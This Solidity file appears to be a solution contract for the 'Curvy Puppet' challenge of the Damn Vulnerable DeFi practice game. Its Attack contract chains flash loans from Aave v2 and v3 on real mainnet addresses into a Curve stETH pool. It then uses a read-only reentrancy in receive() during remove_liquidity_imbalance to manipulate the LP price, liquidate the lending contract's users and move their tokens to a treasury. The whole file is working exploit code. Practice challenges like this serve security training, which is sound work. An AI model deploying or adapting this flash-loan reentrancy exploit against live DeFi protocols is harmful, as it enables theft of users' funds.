// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

interface IAave {
    function flashLoan(address _recipient, address[] memory _token, uint256[] memory _amounts, uint256[] memory _modes, address _onBehalfOf, bytes memory _params, uint16 _referralCode) external;
}

contract Attack {
    IAave public constant AAVEv2 = IAave(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAave public constant AAVEv3 = IAave(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    address public constant AAVEv2aToken = 0x030bA81f1c18d280636F32af80b9AAd02Cf0854e;
    address public constant AAVEv3aToken = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;

    IPermit2 public immutable permit2;
    IStableSwap public immutable curvePool;
    CurvyPuppetLending public immutable lending;
    IERC20 public immutable stETH;
    WETH public immutable weth;
    IERC20 public immutable lpToken;
    DamnValuableToken public immutable dvtToken;
    address public immutable treasury;
    uint256 public immutable initialWETHBalance;

    address[] public users;
    bool public toggle;

    constructor(IPermit2 _permit2, IStableSwap _curvePool, CurvyPuppetLending _lending, IERC20 _stETH, WETH _weth, address _lpToken, DamnValuableToken _dvtToken, address _treasury, uint256 _initialWETHBalance, address[] memory _users) {
        permit2 = _permit2;
        curvePool = _curvePool;
        lending = _lending;
        stETH = _stETH;
        weth = _weth;
        lpToken = IERC20(_lpToken);
        dvtToken = _dvtToken;
        treasury = _treasury;
        initialWETHBalance = _initialWETHBalance;

        for (uint8 i = 0; i < _users.length; i++) {
            users.push(_users[i]);
        }

        weth.approve(address(AAVEv2), type(uint256).max);
        weth.approve(address(AAVEv3), type(uint256).max);
        weth.approve(address(AAVEv2aToken), type(uint256).max);
        weth.approve(address(AAVEv3aToken), type(uint256).max);

        lpToken.approve(address(permit2), type(uint256).max);
        permit2.approve(address(lpToken), address(lending), type(uint160).max, uint48(block.timestamp));
    }

    function flashLoan() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = weth.balanceOf(toggle ? AAVEv2aToken : AAVEv3aToken);

        uint256[] memory modes = new uint256[](1);
        modes[0] = uint256(0);

        IAave aave = IAave(toggle ? address(AAVEv2) : address(AAVEv3));
        aave.flashLoan(address(this), tokens, amounts, modes, address(this), bytes(""), uint16(0));
    }

    function executeOperation(address[] calldata, uint256[] calldata, uint256[] calldata, address, bytes calldata) external returns (bool) {
        if (!toggle) {
            toggle = true;
            this.flashLoan();
            return true;
        }

        uint256 balance = weth.balanceOf(address(this));
        weth.withdraw(balance);

        uint256[2] memory amounts;
        amounts[0] = address(this).balance;
        amounts[1] = uint256(0);

        uint256 lpAdded = curvePool.add_liquidity{value: address(this).balance}(amounts, 0);

        amounts[0] = uint256(1e20);
        amounts[1] = uint256(3554e19);

        curvePool.remove_liquidity_imbalance(amounts, lpAdded);
        curvePool.remove_liquidity_one_coin(lpToken.balanceOf(address(this)) - 3e18, 0, 0);

        weth.deposit{value: address(this).balance}();
        return true;
    }

    receive() external payable {
        if (msg.sender == address(weth) || !toggle) return;
        toggle = false;

        for (uint8 i = 0; i < users.length; i++) {
            lending.liquidate(users[i]);
        }

        dvtToken.transfer(treasury, dvtToken.balanceOf(address(this)));
    }
}